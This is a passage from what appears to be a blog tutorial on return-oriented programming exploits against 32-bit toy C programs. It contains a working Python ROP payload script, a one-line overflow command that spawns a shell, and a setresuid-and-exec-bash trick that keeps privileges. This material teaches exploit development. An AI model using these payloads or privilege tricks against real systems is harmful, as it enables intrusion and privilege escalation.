| &amp;lt;value to write&amp;gt;                     |
| &amp;lt;address to write to&amp;gt;                |
| &amp;lt;address of pop %ecx; pop %eax; ret&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).&lt;/p&gt;
&lt;p&gt;Other useful gadgets include &lt;code&gt;xchg %eax, %esp&lt;/code&gt; and &lt;code&gt;add $0x1c,%esp&lt;/code&gt;, which can be used to modify the stack pointer and &lt;em&gt;pivot&lt;/em&gt; it to a attacker controlled buffer. This is useful if the original vulnerability only gave control over &lt;code&gt;%eip&lt;/code&gt; (like in a &lt;a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;format string vulnerability&lt;/a&gt;) or if the attacker does not control very much of the stack (as would be the case for a short buffer overflow).&lt;/p&gt;
&lt;h1&gt;Chaining functions&lt;/h1&gt;
&lt;p&gt;We can also use ROP to chain function calls: rather than a dummy return address, we use a &lt;code&gt;pop; ret&lt;/code&gt; gadget to move the stack above the arguments to the first function. Since we are just using the &lt;code&gt;pop; ret&lt;/code&gt; gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic1&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0x0badf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that the goal is to call &lt;code&gt;add_bin&lt;/code&gt;, then &lt;code&gt;add_sh&lt;/code&gt;, then &lt;code&gt;exec_string&lt;/code&gt;. When we call &lt;code&gt;add_bin&lt;/code&gt;, the stack must look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;       |
| &amp;lt;return address&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In our case, we want the argument to be &lt;code&gt;0xdeadbeef&lt;/code&gt; we want the return address to be a &lt;code&gt;pop; ret&lt;/code&gt; gadget. This will remove &lt;code&gt;0xdeadbeef&lt;/code&gt; from the stack and return to the next gadget on the stack. We thus have a gadget to call &lt;code&gt;add_bin(0xdeadbeef)&lt;/code&gt; that looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0xdeadbeef            |
| &amp;lt;address of pop; ret&amp;gt; |
| &amp;lt;address of add_bin&amp;gt;  |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;code&gt;add_sh(0xcafebabe, 0x0badf00d)&lt;/code&gt; use two arguments, we need a &lt;code&gt;pop; pop; ret&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x0badf00d                 |
| 0xcafebabe                 |
| &amp;lt;address of pop; pop; ret&amp;gt; |
| &amp;lt;address of add_sh&amp;gt;        |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When we put these together, our payload looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;address of exec_string&amp;gt;     |
| 0x0badf00d                   |
| 0xcafebabe                   |
| &amp;lt;address of pop; pop; ret&amp;gt;   |
| &amp;lt;address of add_sh&amp;gt;          |
| 0xdeadbeef                   |
| &amp;lt;address of pop; ret&amp;gt;        |
| &amp;lt;address of add_bin&amp;gt;         |
| 0x42424242 (fake saved %ebp) |
| 0x41414141 ...               |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)   |
|   ... 0x41414141             |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This time we will use a &lt;code&gt;python&lt;/code&gt; wrapper (which will also show off the use of the very useful &lt;code&gt;struct&lt;/code&gt; python module).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;

&lt;span class="c1"&gt;# These values were found with `objdump -d a.out`.&lt;/span&gt;
&lt;span class="n"&gt;pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048474&lt;/span&gt;
&lt;span class="n"&gt;pop_pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048473&lt;/span&gt;
&lt;span class="n"&gt;exec_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048414&lt;/span&gt;
&lt;span class="n"&gt;add_bin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048428&lt;/span&gt;
&lt;span class="n"&gt;add_sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048476&lt;/span&gt;

&lt;span class="c1"&gt;# First, the buffer overflow.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mh"&gt;0x6c&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;BBBB&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# The add_bin(0xdeadbeef) gadget.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# The add_sh(0xcafebabe, 0x0badf00d) gadget.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xbadf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Our final destination.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./a.out &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Some useful tricks&lt;/h1&gt;
&lt;p&gt;One common protection you will see on modern systems is for &lt;code&gt;bash&lt;/code&gt; to drop privileges if it is executed with a higher effective user id than saved user id. This is a little bit annoying for attackers, because &lt;code&gt;/bin/sh&lt;/code&gt; frequently is a symlink to &lt;code&gt;bash&lt;/code&gt;. Since &lt;code&gt;system&lt;/code&gt; internally executes &lt;code&gt;/bin/sh -c&lt;/code&gt;, this means that commands run from &lt;code&gt;system&lt;/code&gt; will have privileges dropped!&lt;/p&gt;
&lt;p&gt;In order to circumvent this, we will instead use &lt;code&gt;execlp&lt;/code&gt; to execute a &lt;code&gt;python&lt;/code&gt; script we control in our local directory. We will demonstrate this and a few other tricks while exploiting the following simple program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;STDIN_FILENO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The general strategy will be to execute a &lt;code&gt;python&lt;/code&gt; script via &lt;code&gt;execlp&lt;/code&gt;, which searches the &lt;code&gt;PATH&lt;/code&gt; environment variable for an executable of the correct name.&lt;/p&gt;
&lt;h2&gt;Unix filenames&lt;/h2&gt;
&lt;p&gt;We know how to find the address of &lt;code&gt;execlp&lt;/code&gt; using &lt;code&gt;gdb&lt;/code&gt;, but what file do we execute? The trick is to realize that Unix filenames can have (almost) arbitrary characters in them. We then just have to find a string that functions as a valid filename somewhere in memory. Fortunately, those are are all over the text segment of program. In &lt;code&gt;gdb&lt;/code&gt;, we can get all the information we need:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q ./a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) bread main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x80483fd&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x080483fd in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print execlp&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x5564b6f0 &amp;lt;execlp&amp;gt;
&lt;span class="go"&gt;(gdb) x/s main&lt;/span&gt;
&lt;span class="go"&gt;0x80483fa &amp;lt;main&amp;gt;:    &amp;quot;U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will execute the file &lt;code&gt;U\211\345\203\344\360\350\317\377\377\377\270&lt;/code&gt;. We first create this file in some temporary directory and make sure it is executable&lt;sup id="fnref-10"&gt;&lt;a class="footnote-ref" href="#fn-10"&gt;7&lt;/a&gt;&lt;/sup&gt; and in our &lt;code&gt;PATH&lt;/code&gt;. We want a bash shell, so for now the file will simply ensure &lt;code&gt;bash&lt;/code&gt; will not drop privileges:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vim &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; cat &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/bin/python
&lt;span class="go"&gt;import os&lt;/span&gt;
&lt;span class="go"&gt;os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())&lt;/span&gt;
&lt;span class="go"&gt;os.execlp(&amp;quot;bash&amp;quot;, &amp;quot;bash&amp;quot;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open&lt;/h2&gt;
&lt;p&gt;Before we can exploit this, we have to be aware of one last trick. We want to avoid closing &lt;code&gt;stdin&lt;/code&gt; when we exec our shell. If we just naively piped output to our program through &lt;code&gt;python&lt;/code&gt;, we would see &lt;code&gt;bash&lt;/code&gt; execute and then quit immediately. What we do instead is we use a special &lt;code&gt;bash&lt;/code&gt; sub shell and &lt;code&gt;cat&lt;/code&gt; to keep &lt;code&gt;stdin&lt;/code&gt; open&lt;sup id="fnref-11"&gt;&lt;a class="footnote-ref" href="#fn-11"&gt;8&lt;/a&gt;&lt;/sup&gt;. The following command concatenates the output of the &lt;code&gt;python&lt;/code&gt; command with standard in, thus keeping it open for &lt;code&gt;bash&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;cat &amp;lt;(python -c &amp;#39;print &amp;quot;my_payload&amp;quot;&amp;#39;) - | ./a.out&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we know all the tricks we need, we can exploit the program. First, we plan what we want the stack to look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x0 (NULL)                              |
| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
| 0x5564b6f0 &amp;lt;address of execlp&amp;gt;          |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt;              |
| 0x41414141 ...                          |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)              |
|   ... 0x41414141                        |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Putting it all together, we get our shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - &lt;span class="p"&gt;|&lt;/span&gt; ./a.out
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To recap, this exploit required us to use the following tricks in addition to ROP:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Executing &lt;code&gt;python&lt;/code&gt; since &lt;code&gt;bash&lt;/code&gt; drops privileges&lt;/li&gt;
&lt;li&gt;Controlling the &lt;code&gt;PATH&lt;/code&gt; and executing a file in a directory we control with &lt;code&gt;execlp&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Choosing a filename that was a "string" of bytes from the code segment.&lt;/li&gt;
&lt;li&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open using &lt;code&gt;bash&lt;/code&gt; sub shells and &lt;code&gt;cat&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Debugging&lt;/h1&gt;
&lt;h2&gt;&lt;code&gt;gdb&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;When you exploit doesn't work the first time, there are some tricks you can use to debug and figure out what is going on. The first thing you should do is run the exploit in &lt;code&gt;gdb&lt;/code&gt; with your payload. You should break on the return address of the function you are overflowing and print the stack to make sure it is what you expect. In the following example, I forgot to do &lt;code&gt;ulimit -s unlimited&lt;/code&gt; before calculating &lt;code&gt;libc&lt;/code&gt; addresses so the address of &lt;code&gt;execlp&lt;/code&gt; is wrong:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /tmp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) disas vulnerable_read&lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function vulnerable_read:&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d4 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d5 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d7 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483dd &amp;lt;+9&amp;gt;:  movl   $0xc8,0x8(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483e5 &amp;lt;+17&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x080483e8 &amp;lt;+20&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483ec &amp;lt;+24&amp;gt;: movl   $0x0,(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483f3 &amp;lt;+31&amp;gt;: call   0x80482f0 &amp;lt;read@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x080483f8 &amp;lt;+36&amp;gt;: leave  &lt;/span&gt;
&lt;span class="go"&gt;   0x080483f9 &amp;lt;+37&amp;gt;: ret    &lt;/span&gt;
&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) break *0x080483f9&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x80483f9&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run &amp;lt;in&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/a.out &amp;lt;in&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x080483f9 in vulnerable_read ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0  0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It should look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
